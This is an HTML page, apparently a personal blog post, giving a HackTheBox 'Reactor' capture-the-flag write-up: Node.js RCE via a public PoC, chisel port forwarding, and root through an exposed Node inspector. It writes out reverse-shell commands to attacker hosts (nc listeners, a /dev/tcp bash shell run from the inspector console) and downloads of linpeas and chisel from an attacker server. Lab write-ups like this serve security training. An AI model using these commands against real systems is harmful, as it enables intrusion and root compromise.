@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self';">
+  <title>Reactor | Alberto Erbusti</title>
+  <meta name="description" content="Writeup for HackTheBox Reactor — Node.js RCE via CVE, port forwarding with chisel, and root through Chrome DevTools remote debug console.">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+
+  <nav>
+    <a class="nav-logo" href="../index.html"><span>~/</span>albierbi</a>
+    <ul class="nav-links">
+      <li><a href="../index.html#about">About</a></li>
+      <li><a href="../writeups/" class="active">Writeups</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+    </ul>
+  </nav>
+
+  <div class="writeup-hero">
+    <div class="writeup-hero-inner">
+      <div class="writeup-back">
+        <a href="../writeups/">&larr; all writeups</a>
+      </div>
+      <div class="writeup-meta-top">
+        <span class="platform-badge badge-htb">HackTheBox</span>
+        <span class="diff-badge diff-easy">easy</span>
+      </div>
+      <h1 class="writeup-title">Reactor</h1>
+      <p class="writeup-subtitle">Node.js RCE via a known CVE for initial access, chisel for port forwarding without SSH credentials, then root through a Node.js inspector debug console accessible via Chrome DevTools.</p>
+      <div class="writeup-tags">
+        <span class="tag">node.js</span>
+        <span class="tag">rce</span>
+        <span class="tag">cve</span>
+        <span class="tag">chisel</span>
+        <span class="tag">port-forwarding</span>
+        <span class="tag">inspector</span>
+        <span class="tag">privesc</span>
+      </div>
+      <div class="writeup-date">Completed &mdash; 2026-05-24</div>
+    </div>
+  </div>
+
+  <div class="writeup-body">
+
+    <aside class="writeup-toc">
+      <div class="toc-label">// contents</div>
+      <ul>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#foothold">Foothold</a></li>
+        <li><a href="#privesc">Privilege Escalation</a></li>
+        <li><a href="#takeaways">Takeaways</a></li>
+      </ul>
+    </aside>
+
+    <article class="writeup-content">
+
+      <section id="recon">
+        <h2>Recon</h2>
+        <p>Started with a standard Nmap scan.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>nmap -sV -sC 10.10.x.x</pre>
+        </div>
+        <div class="info-grid">
+          <div class="info-row"><span class="port">22</span><span class="service">SSH</span></div>
+          <div class="info-row"><span class="port">3000</span><span class="service">HTTP — Node.js</span></div>
+        </div>
+        <p>Port 3000 served a Node.js application. Version fingerprinting revealed <code>Node.js 15.0.3</code>, which has a known RCE vulnerability.</p>
+      </section>
+
+      <section id="foothold">
+        <h2>Foothold — Node.js RCE</h2>
+        <p>Found a public PoC exploit for the Node.js version. The payload used a crafted busybox reverse shell.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># On attacker — set up listener
+nc -lvnp 4444
+
+# Run the PoC with busybox reverse shell payload
+python3 exploit.py --target http://10.10.x.x:3000 --lhost ATTACKER_IP --lport 4444</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Shell received</div>
+          <p>Got a shell back. Upgraded to a full TTY:</p>
+        </div>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# ctrl+z
+stty raw -echo; fg</pre>
+        </div>
+        <p>Transferred and ran linpeas for local enumeration.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># On attacker
+python3 -m http.server 8000
+
+# On victim
+wget http://ATTACKER_IP:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Interesting process found</div>
+          <p><code>/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js</code> running as root with the Node.js inspector exposed on localhost.</p>
+        </div>
+      </section>
+
+      <section id="privesc">
+        <h2>Privilege Escalation: Node.js Inspector via Chisel</h2>
+        <p>The inspector was bound to <code>127.0.0.1:9229</code>, only accessible locally. No SSH credentials or keys were available to forward the port directly. Used <code>chisel</code> to tunnel it out instead.</p>
+        <div class="callout callout-info">
+          <div class="callout-title">What is chisel?</div>
+          <p>Chisel is a TCP tunnel over HTTP. Running it in server mode on the attacker and client mode on the victim lets you forward ports without SSH, as long as you can transfer a binary.</p>
+        </div>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># Transfer chisel to victim
+wget http://ATTACKER_IP:8000/chisel
+chmod +x chisel
+
+# On attacker — start chisel server
+./chisel server --reverse --port 8001
+
+# On victim — connect and forward port 9229
+./chisel client 10.10.15.63:8001 R:9229:localhost:9229</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Tunnel established</div>
+          <p>Port 9229 on the victim is now accessible as <code>localhost:9229</code> on the attacker.</p>
+        </div>
+        <p>Opened <code>chrome://inspect</code> in Chromium. The inspector console for the root-owned Node.js process appeared as a remote target. Connected to it and executed a reverse shell from the debug console.</p>
+        <div class="code-block">
+          <div class="code-label">node inspector console</div>
+          <pre>require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.15.63/5555 0>&1"')</pre>
+        </div>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># On attacker, listener on port 5555
+nc -lvnp 5555</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Root shell</div>
+          <p>The process was running as root, so the shell came back with full privileges.</p>
+        </div>
+      </section>
+
+      <section id="takeaways">
+        <h2>Takeaways</h2>
+        <div class="callout callout-info">
+          <div class="callout-title">Key lessons</div>
+          <ul>
+            <li>Always fingerprint the exact runtime version, Node.js 15.0.3 is specific enough to find a targeted CVE immediately</li>
+            <li>Chisel is invaluable when you need port forwarding but have no SSH access</li>
+            <li><code>--inspect</code> bound to localhost on a root process is a direct privesc path; <code>chrome://inspect</code> makes it trivial to exploit</li>
+            <li>linpeas highlights running processes and their flags so always read that section carefully, not just the SUID and sudo output</li>
+          </ul>
+        </div>
+      </section>
+
+    </article>
+  </div>
+
+  <footer>
+    <span>&copy; 2026 Alberto Erbusti</span>
+    <a href="../writeups/" class="footer-back">&larr; back to writeups</a>
+  </footer>
+
+</body>
+</html>
